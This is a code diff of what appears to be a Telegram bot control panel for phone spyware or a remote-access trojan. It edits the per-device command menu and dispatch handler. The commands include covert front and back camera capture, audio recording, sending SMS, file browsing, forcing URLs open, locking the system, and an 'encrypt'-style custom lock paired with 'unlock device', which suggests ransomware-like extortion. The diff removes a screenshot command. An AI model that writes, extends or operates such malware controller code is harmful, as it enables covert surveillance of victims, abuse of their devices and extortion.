@@ -86,19 +86,18 @@ function sendCommandMenu(ctx, deviceId, deviceName) {
                     Markup.button.callback('📷 Back Camera',  `cmd_cb_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('🖼️ Screenshot',   `cmd_scr_${deviceId}`),
+                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`),
                     Markup.button.callback('🎙️ Record Audio', `cmd_recmode_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`),
-                    Markup.button.callback('📁 Browse Files', `cmd_files_${deviceId}`)
+                    Markup.button.callback('📁 Browse Files', `cmd_files_${deviceId}`),
+                    Markup.button.callback('🌐 Open URL',     `cmd_urlmode_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('🌐 Open URL',     `cmd_urlmode_${deviceId}`),
-                    Markup.button.callback('🔒 System Lock',  `cmd_lock_${deviceId}`)
+                    Markup.button.callback('🔒 System Lock',  `cmd_lock_${deviceId}`),
+                    Markup.button.callback('🔑 Custom Lock',  `cmd_encryptmode_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('🔑 Custom Lock',  `cmd_encryptmode_${deviceId}`),
                     Markup.button.callback('🔓 Unlock Device', `cmd_decrypt_${deviceId}`)
                 ],
                 [Markup.button.callback('« Back to Devices', 'back_to_devices')]
@@ -141,7 +140,7 @@ bot.action(/^select_device_(.+)$/, async (ctx) => {
 });
 
 // Run a command on the selected device (excludes smsmode, recmode, encryptmode — handled separately)
-bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files|decrypt|scr)_(.+)$/, async (ctx) => {
+bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files|decrypt)_(.+)$/, async (ctx) => {
     const command = ctx.match[1];
     const deviceId = ctx.match[2];
     const device = devices[deviceId];
@@ -159,8 +158,7 @@ bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files|decrypt|scr)_(.+)$/, async 
         cb:      '📷 Back Camera',
         lock:    '🔒 System Lock',
         files:   '📁 Browse Files',
-        decrypt: '🔓 Unlock Device',
-        scr:     '🖼️ Screenshot'
+        decrypt: '🔓 Unlock Device'
     };
 
     device.pendingCommand = command;
